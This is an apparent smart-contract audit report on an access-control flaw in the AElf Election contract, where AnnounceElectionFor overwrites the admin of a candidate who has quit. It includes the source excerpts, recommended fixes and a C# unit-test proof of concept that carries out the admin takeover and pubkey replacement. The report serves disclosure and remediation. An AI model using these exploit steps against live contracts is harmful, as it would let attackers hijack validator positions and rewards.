# Audit Report

## Title
Unauthorized Admin Takeover via AnnounceElectionFor After Candidate Quits Election

## Summary
The `AnnounceElectionFor` method unconditionally overwrites the `CandidateAdmins` mapping for any pubkey that has quit election, allowing an attacker to seize admin control without authorization. This enables complete takeover of candidate operations including the ability to replace the candidate's pubkey, quit on their behalf, and hijack any associated validator position.

## Finding Description

The vulnerability exists in the interaction between `QuitElection` and `AnnounceElectionFor` methods in the Election contract.

**Root Cause 1 - Admin Mapping Not Cleared on Quit:**

When a candidate calls `QuitElection`, the method performs several cleanup operations but critically fails to clear the `State.CandidateAdmins[initialPubkey]` mapping. [1](#0-0) 

While the method removes the pubkey from `ManagedCandidatePubkeysMap` (the reverse mapping) and sets `IsCurrentCandidate = false`, the admin mapping entry remains populated with the original owner's admin address, creating stale state. [2](#0-1) 

**Root Cause 2 - Unconditional Admin Overwrite:**

The `AnnounceElectionFor` method allows anyone to announce election on behalf of any pubkey by providing their public key string and an admin address. The method unconditionally sets `State.CandidateAdmins[pubkey] = admin` without any authorization checks or validation that an admin already exists. [3](#0-2) 

**Root Cause 3 - Re-announcement Allowed for Quit Candidates:**

The private `AnnounceElection` helper method explicitly permits re-announcing a pubkey that was previously a candidate but has quit. When `candidateInformation` exists (from the previous announcement), the code checks `!candidateInformation.IsCurrentCandidate` and allows the re-announcement to proceed if the candidate is not currently active. [4](#0-3) 

**Why Protections Fail:**

The `CandidateAdmins` state mapping tracks the admin address for each candidate pubkey. [5](#0-4) 

However, no protection exists against overwriting an existing admin mapping when re-announcing a quit candidate. The method assumes that if a candidate can be announced, it's safe to set the admin, without considering that:
1. The pubkey may have historical admin ownership from a previous announcement
2. The caller may not have permission from the original owner
3. No signature verification proves the caller controls or has authorization from the pubkey owner

## Impact Explanation

**Direct Unauthorized Control:**

Once the attacker overwrites the admin mapping, they gain full administrative control over the candidate. This is verified by examining the permission checks in critical operations:

1. **ReplaceCandidatePubkey**: Requires the sender to be the candidate admin, allowing the attacker to replace the original pubkey with one they control. [6](#0-5) 

2. **QuitElection**: Requires the sender to be the admin of the initial pubkey, enabling the attacker to force-quit the candidate. [7](#0-6) 

3. **SetCandidateAdmin**: When an admin is already set, only the current admin can change it, allowing the attacker to consolidate permanent control. [8](#0-7) 

**Validator Position Hijacking:**

By using `ReplaceCandidatePubkey`, the attacker can replace the original pubkey with one they control. This allows them to:
- Inherit any existing voting weight associated with the original candidate
- Potentially become elected as a validator using the hijacked candidate slot
- Receive validator rewards and consensus participation rights
- Leverage historical reputation (produced blocks, terms served) that transfers with the candidate information

**Severity: CRITICAL** - This violates the fundamental invariant that admin control should only be authorized by the legitimate owner or governance. It enables complete takeover of candidate operations and potential validator position hijacking.

## Likelihood Explanation

**Attacker Capabilities Required:**
- Ability to call public contract methods (any blockchain user)
- Sufficient native tokens to pay the announcement fee (`ElectionContractConstants.LockTokenForElection`)
- No special permissions, signatures, or trusted role access needed

**Attack Complexity: LOW**

Single transaction attack path:
1. Identify a pubkey that has quit election (publicly queryable via `GetCandidateInformation`)
2. Call `AnnounceElectionFor(quitPubkey, attackerAddress)` paying the announcement fee
3. Immediately gain admin control over the quit candidate

**Feasibility Conditions:**
- Target candidate must have called `QuitElection` (common when validators retire or change strategy)
- No time window restrictions - the vulnerability persists indefinitely after a candidate quits
- The announcement fee is recoverable by quitting again, making the attack nearly cost-free

**Economic Rationality:**
- Attack cost: Only the announcement deposit (recoverable)
- Potential gain: Validator position, block rewards, voting influence, historical reputation
- Risk/reward ratio heavily favors the attacker

**Probability: HIGH** - The vulnerability is trivially exploitable with minimal cost whenever any candidate quits election, which occurs regularly in validator set management.

## Recommendation

Add authorization checks and proper state cleanup to prevent unauthorized admin takeover:

**Fix 1: Clear admin mapping on quit**
```csharp
public override Empty QuitElection(StringValue input)
{
    var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(input.Value);
    QuitElection(pubkeyBytes);
    var pubkey = input.Value;

    var initialPubkey = State.InitialPubkeyMap[pubkey] ?? pubkey;
    Assert(Context.Sender == State.CandidateAdmins[initialPubkey], "Only admin can quit election.");
    
    // ... existing unlock and cleanup logic ...
    
    // FIX: Clear the admin mapping when quitting
    State.CandidateAdmins.Remove(initialPubkey);
    
    // ... rest of method ...
}
```

**Fix 2: Prevent re-announcement overwrite of existing admin**
```csharp
public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
{
    var pubkey = input.Pubkey;
    var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
    
    // FIX: Check if admin already exists and prevent unauthorized overwrite
    var initialPubkey = State.InitialPubkeyMap[pubkey] ?? pubkey;
    Assert(State.CandidateAdmins[initialPubkey] == null, 
        "Cannot re-announce: admin already exists for this pubkey.");
    
    AnnounceElection(pubkeyBytes);
    var admin = input.Admin ?? Context.Sender;
    State.CandidateAdmins[pubkey] = admin;
    
    // ... rest of method ...
}
```

Alternatively, require a signature from the original admin to authorize re-announcement.

## Proof of Concept

```csharp
[Fact]
public async Task AdminTakeover_AfterQuit_Vulnerability_Test()
{
    // Setup: Alice announces election with her admin
    var aliceKeyPair = ValidationDataCenterKeyPairs[0];
    var aliceAdmin = Address.FromPublicKey(aliceKeyPair.PublicKey);
    var aliceElectionStub = GetElectionContractTester(aliceKeyPair);
    
    await aliceElectionStub.AnnounceElection.SendAsync(aliceAdmin);
    
    // Verify Alice is admin
    var adminBefore = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = aliceKeyPair.PublicKey.ToHex() });
    adminBefore.ShouldBe(aliceAdmin);
    
    // Alice quits election
    await aliceElectionStub.QuitElection.SendAsync(
        new StringValue { Value = aliceKeyPair.PublicKey.ToHex() });
    
    // VULNERABILITY: Bob re-announces Alice's pubkey with his own admin
    var bobKeyPair = ValidationDataCenterKeyPairs[1];
    var bobAdmin = Address.FromPublicKey(bobKeyPair.PublicKey);
    var bobElectionStub = GetElectionContractTester(bobKeyPair);
    
    await bobElectionStub.AnnounceElectionFor.SendAsync(new AnnounceElectionForInput
    {
        Pubkey = aliceKeyPair.PublicKey.ToHex(),
        Admin = bobAdmin
    });
    
    // EXPLOIT SUCCESS: Bob is now admin of Alice's candidate
    var adminAfter = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = aliceKeyPair.PublicKey.ToHex() });
    adminAfter.ShouldBe(bobAdmin); // Bob has taken over admin control
    
    // Bob can now replace Alice's pubkey with his own
    var bobNewPubkey = SampleAccount.Accounts[10].KeyPair.PublicKey.ToHex();
    var bobAdminStub = GetElectionContractTester(bobKeyPair);
    
    var replaceResult = await bobAdminStub.ReplaceCandidatePubkey.SendAsync(
        new ReplaceCandidatePubkeyInput
        {
            OldPubkey = aliceKeyPair.PublicKey.ToHex(),
            NewPubkey = bobNewPubkey
        });
    
    replaceResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    // Alice's validator slot is now controlled by Bob
}
```

## Notes

This vulnerability represents a critical breakdown in access control for the Election contract's candidate admin system. The attack is economically rational, requires no special privileges, and directly threatens the integrity of the validator election process. The combination of stale state retention and unconditional overwrites creates a permanent window for unauthorized takeover of any quit candidate.

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L29-42)
```csharp
            if (State.CandidateAdmins[pubkey] == null)
            {
                // If admin is not set before (due to old contract code)
                Assert(Context.Sender == Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(input.Pubkey)),
                    "No permission.");
            }
            else
            {
                var oldCandidateAdmin = State.CandidateAdmins[pubkey];
                Assert(Context.Sender == oldCandidateAdmin, "No permission.");
            }
        }

        State.CandidateAdmins[pubkey] = input.Admin;
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-142)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
        var managedPubkeys = State.ManagedCandidatePubkeysMap[admin] ?? new PubkeyList();
        managedPubkeys.Value.Add(ByteString.CopyFrom(pubkeyBytes));
        State.ManagedCandidatePubkeysMap[admin] = managedPubkeys;
        LockCandidateNativeToken();
        AddCandidateAsOption(pubkey);
        if (State.Candidates.Value.Value.Count <= GetValidationDataCenterCount())
        {
            State.DataCentersRankingList.Value.DataCenters.Add(pubkey, 0);
            RegisterCandidateToSubsidyProfitScheme(pubkey);
        }

        State.CandidateSponsorMap[input.Pubkey] = Context.Sender;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L154-162)
```csharp
        if (candidateInformation != null)
        {
            Assert(!candidateInformation.IsCurrentCandidate,
                $"This public key already announced election. {pubkey}");
            candidateInformation.AnnouncementTransactionId = Context.OriginTransactionId;
            candidateInformation.IsCurrentCandidate = true;
            // In this way we can keep history of current candidate, like terms, missed time slots, etc.
            State.CandidateInformationMap[pubkey] = candidateInformation;
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L229-280)
```csharp
    public override Empty QuitElection(StringValue input)
    {
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(input.Value);
        QuitElection(pubkeyBytes);
        var pubkey = input.Value;

        var initialPubkey = State.InitialPubkeyMap[pubkey] ?? pubkey;
        Assert(Context.Sender == State.CandidateAdmins[initialPubkey], "Only admin can quit election.");
        var candidateInformation = State.CandidateInformationMap[pubkey];

        // Unlock candidate's native token.
        var lockId = candidateInformation.AnnouncementTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = lockVirtualAddress,
            To = State.CandidateSponsorMap[input.Value] ?? Address.FromPublicKey(pubkeyBytes),
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Quit election."
        });

        // Update candidate information.
        candidateInformation.IsCurrentCandidate = false;
        candidateInformation.AnnouncementTransactionId = Hash.Empty;
        State.CandidateInformationMap[pubkey] = candidateInformation;

        // Remove candidate public key from the Voting Item options.
        State.VoteContract.RemoveOption.Send(new RemoveOptionInput
        {
            VotingItemId = State.MinerElectionVotingItemId.Value,
            Option = pubkey
        });
        var dataCenterList = State.DataCentersRankingList.Value;
        if (dataCenterList.DataCenters.ContainsKey(pubkey))
        {
            dataCenterList.DataCenters[pubkey] = 0;
            UpdateDataCenterAfterMemberVoteAmountChanged(dataCenterList, pubkey, true);
            State.DataCentersRankingList.Value = dataCenterList;
        }

        var managedCandidatePubkey = State.ManagedCandidatePubkeysMap[Context.Sender];
        managedCandidatePubkey.Value.Remove(ByteString.CopyFrom(pubkeyBytes));
        if (managedCandidatePubkey.Value.Any())
            State.ManagedCandidatePubkeysMap[Context.Sender] = managedCandidatePubkey;
        else
            State.ManagedCandidatePubkeysMap.Remove(Context.Sender);

        State.CandidateSponsorMap.Remove(pubkey);

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContractState.cs (L68-68)
```csharp
    public MappedState<string, Address> CandidateAdmins { get; set; }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L173-184)
```csharp
    public override Empty ReplaceCandidatePubkey(ReplaceCandidatePubkeyInput input)
    {
        Assert(IsCurrentCandidateOrInitialMiner(input.OldPubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.OldPubkey) && !IsPubkeyBanned(input.NewPubkey),
            "Pubkey is in already banned.");

        // Permission check.
        Assert(Context.Sender == GetCandidateAdmin(new StringValue { Value = input.OldPubkey }), "No permission.");

        // Record the replacement.
        PerformReplacement(input.OldPubkey, input.NewPubkey);
```
